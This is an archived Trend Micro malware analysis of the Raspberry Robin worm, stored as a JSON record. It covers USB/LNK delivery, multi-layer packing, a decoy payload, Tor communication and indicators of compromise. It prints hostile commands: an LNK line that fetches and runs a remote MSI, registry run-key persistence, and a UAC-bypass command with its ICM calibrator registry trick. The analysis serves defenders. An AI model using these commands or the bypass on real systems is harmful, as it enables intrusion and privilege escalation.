{
    "id": "598fe40d-375a-429a-bb5e-c406c00c94ce",
    "created_at": "2023-04-05T02:10:03.505319Z",
    "updated_at": "2025-03-27T02:06:06.084373Z",
    "deleted_at": null,
    "sha1_hash": "bd0f33d2e2ac8f7c8907489ca5f99b822d2e0756",
    "title": "2022-12-20 - Raspberry Robin Malware Targets Telecom, Governments",
    "authors": "",
    "file_creation_date": "2023-04-03T08:26:49Z",
    "file_modification_date": "2023-04-03T08:26:49Z",
    "file_size": 1506036,
    "plain_text": "# Raspberry Robin Malware Targets Telecom, Governments\n\n**[trendmicro.com/fr_fr/research/22/l/raspberry-robin-malware-targets-telecom-governments.html](https://www.trendmicro.com/fr_fr/research/22/l/raspberry-robin-malware-targets-telecom-governments.html)**\n\nProgrammes malveillants\n\n\n20 décembre 2022\n\n\nWe found samples of the Raspberry Robin malware spreading in telecommunications and government office systems beginning\nSeptember. The main payload itself is packed with more than 10 layers for obfuscation and is capable of delivering a fake payload\nonce it detects sandboxing and security analytics tools.\n\nBy: Christopher So\nDecember 20, 2022\nRead time: ( words)\n\nWe found a malware sample allegedly capable of connecting to the Tor network to deliver its payloads. Our initial analysis of the\nmalware, which compromised a number of organizations toward the end of September, showed that while the main malware routine\ncontains both the real and fake payloads, it loads the fake payload once it detects sandboxing tools to evade security and analytics\ntools from detecting and studying the malware's real routine. Meanwhile, the real payload remains obfuscated under packing layers\n[and subsequently connects to the Tor network. The campaign and malware, identified as Raspberry Robin by Red Canary (detected](https://redcanary.com/blog/raspberry-robin/)\nby Trend Micro as Backdoor.Win32.RASPBERRYROBIN.A), seemingly spreads to systems with worm-like capabilities (due to the\nuse of .lnk files) via an infected USB.\n\nGiven the malware’s layering features and the stages of its infection routine, we are still confirming its main motivation for\ndeployment. Currently, its possible motivation ranges from theft to cyberespionage. So far, we have noted the malware’s capability to\nhide itself via multiple layers for obfuscation, as well as its feature of delivering a fake payload once the routine detects sandboxing\nand analysis solutions. The group behind Raspberry Robin appears to be testing the waters to see how far its deployments can\nspread. Majority of the group’s victims are either government agencies or telecommunication entities from Latin America, Oceania\n(Australia), and Europe. Given the varying samples we have acquired since detecting these deployments, we are continuing to\nmonitor the developments for this malware as they occur.\n\nFigure 1. Percentage of Raspberry Robin detections worldwide from October to November\nArrival routine\n\n\n-----\n\nFigure 2. Raspberry Robin infection routine\nOnce the user connects the infected USB to the system, Raspberry Robin initially arrives as a shortcut or LNK file. The LNK file\ncontains a command line that runs a legitimate executable to download a Windows Installer (MSI) package. This legitimate\nexecutable is usually msiexec.exe, but we have also seen wmic.exe used in other samples.\n\nFigure 3. File containing a command line to run an executable\n\nWith obfuscation removed, the LNK file contains a target similar to the format \"cmd.exe /c start msiexec {URL}\". When the LNK file is\ndouble-clicked, the Windows Shell \"opens\" the shortcut file. In this case, \"open\" would mean \"execute\" since the first item in the\ntarget is an executable file (cmd.exe). Cmd.exe then interprets anything after the switch /c as a command and executes it as if it was\ntyped directly in a Command Prompt window. After executing the command, it exits. In this case, the command is \"start msiexec\n_{URL}\"._\n\n\n-----\n\nWhen opened, it causes the target executable (cmd.exe) to execute with its parameters; the target executable is the URL where the\nMSI file is hosting the main malware. The \"start\" command is commonly used to execute another program without waiting for it to\nexit. If it did not use \"start\", cmd.exe will have to wait for msiexec to terminate before terminating itself. The malware is downloaded,\ntreats the downloaded data as an MSI (Windows Installer) file and, if successful, is loaded by the legitimate executable file. The\ndownloaded link has the following format:\n\n_http[:]//{domain}:8080/{random strings and /}/<computer name>_\n_http[:]//{domain}:8080/{random strings and /}/<computer name>=<user name>_\n_http[:]//{domain}:8080/{random strings and /}/<computer name>?<user name>_\n\nThe slashes in the LNK are a combination of forward slashes (/) and backslashes (\\). The domain is typically composed of two to four\nalphanumeric characters, followed by a dot and two additional characters.\n\nMain malware\n\nTo prevent researchers from analyzing this malware, Raspberry Robin’s main malware itself is packed multiple times, with each layer\nheavily obfuscated.\n\nCode obfuscation\n\nThe code is obfuscated in different ways. Starting from the third layer, each subroutine can be thought of as a state machine and\nimplemented as a loop. At the start of each subroutine, the table of values is decrypted. This table of values serves as a container for\nconstant values used in the subroutine, as well as the state transition table.\n\nFigure 4. Each subroutine implemented as a\n\nloop\nAnother obfuscation technique used to hide the main malware obfuscates the call to other subroutines. In regular programs, the\naddress of another subroutine is in the call itself. In this malware, however, the address is computed using hard-coded values and\nvalues from the previously mentioned decrypted table of values. The result of this is placed in a register, and an indirect call is made\nusing the register.\n\n\n-----\n\nFigure 5. Computing for the address\n\nusing hard-coded values and table of values\nPacker characteristics\n\nThis malware is composed of two payloads embedded in a payload loader packed six times.\n\nFigure 6. A visual representation of the Raspberry Robin’s packing\nThe first and second layers belong to a single packer. The code at the entry point of the first layer only has four instructions:\n\n1. A sequence of a call to unpack the embedded loader\n2. A sequence to unpack the payload\n3. A jump to the loader, setting the return value to 1\n4. The return instruction\n\nIn reality, however, this layer is typically obfuscated as shown by this code snippet:\n\n\n-----\n\nFigure 7. First and second layer packing\n\nDumping the second layer, we saw that the third layer is located just after the second layer code, at offset 0x3F0:\n\n\n-----\n\nFigure 8. Dumping the second layer and going to the third\n\nWe noted layers 3 and 5 as capable of anti-analysis techniques. Meanwhile, we found that not all layers have unique packers. The\nfourth and seventh layers are identical, as well as the tenth and thirteenth. The packing of the eighth and fourteenth layers are also\nsimilar. This repeated use of packers implies that the group is using a separate packing program. We are continuing with our analysis\nto see if this program is their own or if it is outsourced to other groups, as this technique can be indicative of the group’s future use of\nthese same packers. It is also possible for these same packers to be replaced with variations in patterns.\n\nOn layer 8, the payload loader, the execution splits into two paths. If the malware detects that it is being analyzed, it loads the fake\npayload. Otherwise, it loads the real payload.\n\n## Fake payload\n\nThe fake payload has two layers, the first of which is a shellcode with an embedded PE file, while the second layer is a PE file with\nthe MZ header and PE signature removed. The second layer is loaded by the first layer and jumps into it.\n\nUpon execution, the second layer immediately creates a thread to where its main routine is located. It first attempts to read the\nregistry value named “Active” at <HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Media>. This serves as an infection marker. If the\nread fails, it proceeds to write the string value “1” into this registry value, then gathers system information: the computer name,\ncurrent username, processor brand, and display device names. In some versions of the fake payload, the data is encrypted using\nRC4 with a hard-coded key. The system information is then appended to the URL http[:]//{IP address}:8080/. The full URL is then\naccessed, and a file is downloaded. In some versions of the malware, this downloaded file is also executed.\n\nAnalyzing other sample versions of the fake payload, we found that if the main routine is successful, it checks if the system is linked\nto a domain by checking the existence of the environment variable USERDNSDOMAIN. If this variable does not exist, it drops and\nexecutes an adware named BrowserAssistant to %User Temp%\\{random number}.exe, likely to make an analyst feel complacent\nabout allegedly already finding the payload and therefore no longer needing to conduct further studies of the samples.\n\nReal payload\n\nThe real payload is made up of three layers, with the third layer containing the actual payload binary packed twice. Within the real\npayload is an embedded custom Tor client designed to communicate with the real payload using shared memory.\n\n**Installation**\n\n\n-----\n\nIts method for checking whether the malware has been installed on the system involves checking if it is running in Session 0. Prior to\n[Windows Vista, services were run in the session of the first user to log in to the system, which is called Session 0. However, from](https://techcommunity.microsoft.com/t5/ask-the-performance-team/sessions-desktops-and-windows-stations/ba-p/372473)\n[Windows Vista onward, Microsoft introduced a security enhancement called “Session 0 Isolation,” where Session 0 is now reserved](https://learn.microsoft.com/en-us/windows-hardware/drivers/wdf/session-zero-guidelines-for-umdf-drivers)\nfor services and other non-interactive user applications.\n\nWith this security enhancement, the threat actor confirms whether the user profile is running on administrative privileges or not. If it is\nnot in Session 0, it drops a copy of itself in <%ProgramData%\\{random folder name}\\{random file name}.{extension}> to elevate\nprivileges, or <%ProgramData%\\Microsoft\\{random folder name}\\{random file name}.{extension}> if the user is running as an admin.\nIn this manner, a security analyst would view the malicious routine as having been started and run by a legitimate Windows process,\nallowing the routine to evade detection.The extension name is randomly chosen among the following:\n\n.bak\n.dat\n.db\n.dmp\n.etl\n.idx\n.json\n.lkg\n.lock\nlog\n.man\n.tmp\ntxt\n.vdm\n.xml\n.xsd\n\nIt also sets the following registry entry to enable its automatic execution at system startup. If the user is not at an admin level, the\nmalware modifies the registry with\n\n_HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce_\n\n_{random value name} = “rundll32 shell32 ShellExec_RunDLLA REGSVR /u /s “{dropped copy path and file name}.””_\n\nInversely, if the user’s profile is with admin privileges, the registry is modified with\n\n_HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\{random key name}_\n_{random value name} = “shell32|ShellExec_RunDLLA|REGSVR /u /s “{dropped copy path and file name}.””_\n\nPrivilege escalation\n\nAfter dropping a copy of itself, it executes the dropped copy as Administrator using a UAC (User Account Control) bypass technique.\nIt implements a variation of the technique ucmDccwCOMMethod in UACMe, thereby abusing the built-in Windows AutoElevate\nbackdoor.\n\nIt first checks whether atcuf32.dll, aswhook.dll, and avp.exe are loaded in the system. These files are from security defenders\nBitDefender, Avast, and Kaspersky, respectively. If one of these is loaded, it does not proceed to the UAC bypass routine. It then\ndrops a shortcut file to <%User Temp%\\{random file name}.lnk> that contains the command line\n\nrundll32.exe SHELL32,ShellExec_RunDLL \"C:\\Windows\\system32\\ODBCCONF.EXE\" /a {configsysdsn OCNKBENXGMI etba\nodjcnr} /A {installtranslator fxodi} -a {installdriver qmprmxf} /a {configsdn HHAP} regsvr \"{dropped copy path and file name}.\" /S /e -s\n\nIt then creates an elevated COM object for CMLuaUtil and uses it to set a custom display calibrator in the registry that points to the\ndropped LNK file. It sets the custom display calibrator by setting the registry value\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\ICM\\Calibration\n\nDisplayCalibrator = \"%User Temp%\\{random file name}.lnk\"\n\nIt then creates an elevated COM object for ColorDataProxy and calls its method “LaunchDccw” to load the calibrator, thus executing\nthe malicious LNK. Afterward, it sets the registry value DisplayCalibrator to “%SystemRoot%\\System32\\DCCW.exe” to hide its\nactivity.\n\n**Main routine**\n\n\n-----\n\nRunning in Session 0, the real payload attempts to connect to the hard coded Tor addresses, where the connections are made in\nanother process. For the real payload to facilitate the exchange of information and the Tor-connecting process, a shared-named\nmemory map is created with the following format:\n\nTable 1. Shared memory map format\n\n**Offset** **Size** **Description**\n\n00h 1 Flag\n\n01h 1 Success\n\n04h 4 (DWORD) IP address\n\n08h 8 (FILETIME)\n\n10h 4 (DWORD) Data size\n\n14h Data size Data\n\nThe Tor address is written to offset 14h of the shared memory, hard-coded but encrypted within the sample itself. The following are\nsome of the .onion (V2) addresses we identified:\n\nsejnfjrq6szgca7v\nzdfsyv3rubuhpql3\nihdhoeoovbtgutfm\ntapeucwutvne7l5o\n2qlvvvnhqyda2ahd\nanswerstedhctbek\n5j7saze5byfqccf3\ncmgvqnxjoiqthvrc\n3bbaaaccczcbdddz\nsgvtcaew4bxjd7ln\nugw3zjsayleoamaz\nynvs3km32u33agwq\nnjalladnspotetti\npsychonaut3z5aoz\nhabaivdfcyamjhkk\ntorwikignoueupfm\nbitmailendavkbec\ncyphdbyhiddenbhs\nclgs64523yi2bkhz\n76qugh5bey5gum7l\nhd37oiauf5uoz7gg\nexpressobutiolem\ngl3n4wtekbfaubye\narchivecaslytosk\nkyk55bof3hzdiwrm\nqqvyib4j3fz66nuc\nbcwpy5wca456u7tz\npornhubthbh7ap3u\nfncuwbiisyh6ak3i\n\nIn starting its Tor client process, the real payload randomly selects a name among these first:\n\n_dllhost.exe_\n_regsvr32.exe_\n_rundll32.exe_\n\nIt then creates a suspended process, injects the code of the Tor client, resumes the process, and waits for data from the Tor client. As\nfar as what the sample does to the received data, we have not seen any use of it in the wild so far since we did find that the buffer\ncontaining the data is freed without using it.\n\n\n-----\n\nTor client\n\nThe Tor client itself is composed of four layers. The first two layers are packer codes. The third layer retrieves the Tor address from\nthe shared memory, unpacks the fourth layer, and calls the fourth layer to do the actual Tor communication. The data received by the\nfourth layer is encrypted by the third layer and written to the shared memory, to be read by the main routine.\n\nConclusion\n\nNoticeably, the malware uses many anti-analysis techniques, while its main payload is packed with many layers that require analysis.\nTherefore, an analyst who lacks experience will find only the fake payload. Clearly, the actor behind this has made considerable effort\nto hinder analysis.\n\nWhile the technique of packing the codes is not unique, some of the packing layers have very similar codes and can be grouped into\npacker families. The style of packing is also similar on all layers except for the first two: An executable is stripped of some header\ninformation, encrypted, and added to the unpacking code. The group must therefore be using something akin to a packed sample\ngenerator, which takes a payload executable and produces a multi-layered packed sample. On the surface, it looks like the group\ncould be providing this as \"packing service\" or \"executable packing-as-a-service\" (if there is such a term), and the people behind this\ncould be associated with the threat actors behind LockBit. We continue to analyze and document all the anti-debugging techniques\nand layers used in these samples and incidents.\n\nThe use of Session 0 is also sophisticated. The purpose of Session 0 Isolation is to increase system security by preventing services\nrunning in the local system account having user interactions. Isolating services in their own non-interactive sections inaccessible by\nregular processes will decrease the chances of abuse to elevate another piece of (malicious) code's privileges. Hence, having\naccess to Session 0 would mean privilege escalation. However, an attacker must use privilege escalation techniques to gain access.\n\n[From the samples we gathered, we found the abuse of the elevated COM interface. Making one of those elevated COM classes](https://learn.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker)\nexecute the code implies that the malicious actor’s access is also automatically elevated, provided the threat actor finds the specific\nCOM class that can accept a program name (or something similar) and trigger it to run. In this case, it's Image Color Management.\nDisplay calibration is done by a program that is specified in a registry entry. By replacing or adding that entry and then triggering the\nsystem to perform display calibration, whatever is specified in that registry entry will be executed.\n\nIt is also noteworthy that the ICM calibration technique was previously seen in the LockBit ransomware as far as privilege escalation\nis concerned. There is also the similarity of the anti-debugging technique using ThreadHideFromDebugger. However, even if\nRaspberry Robin uses the same techniques, we cannot conclude for certain that the actors behind LockBit and Raspberry Robin are\nthe same. Still, since LockBit operates as a ransomware-as-a-service (RaaS) group, some of the following could still be true:\n\nThe group behind LockBit is also behind Raspberry Robin.\nThe group behind Raspberry Robin is the maker of some of the tools LockBit is also using.\nThe group behind Raspberry Robin availed of the services of the affiliate responsible for the techniques used by LockBit.\n\nGiven that the returned data is empty and was not used, it seems that the actor has been trying to see how far its campaign\noperation can spread, most likely as part of its reconnaissance effort. We can thus consider this an indication of a possible routine for\nthe group’s long-term plans, as well as a possible precursor to a follow-up operation in the future.\n\nIndicator of Compromise (IOC)\n\n**SHA256** **Description** **Detection name**\n\n\n6fb0ad3f756b5d1f871cf34c3e4ea47cb34643cd17709a09c25076c400313adf Main\nmalware\nexecutable\n\n\nBackdoor.Win32.RASPBERRYROBIN.A\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-12-20 - Raspberry Robin Malware Targets Telecom, Governments.pdf"
    ],
    "report_names": [
        "2022-12-20 - Raspberry Robin Malware Targets Telecom, Governments.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1680660603,
    "ts_updated_at": 1743041166,
    "ts_creation_date": 1680510409,
    "ts_modification_date": 1680510409,
    "files": {
        "pdf": "https://archive.orkl.eu/bd0f33d2e2ac8f7c8907489ca5f99b822d2e0756.pdf",
        "text": "https://archive.orkl.eu/bd0f33d2e2ac8f7c8907489ca5f99b822d2e0756.txt",
        "img": "https://archive.orkl.eu/bd0f33d2e2ac8f7c8907489ca5f99b822d2e0756.jpg"
    }
}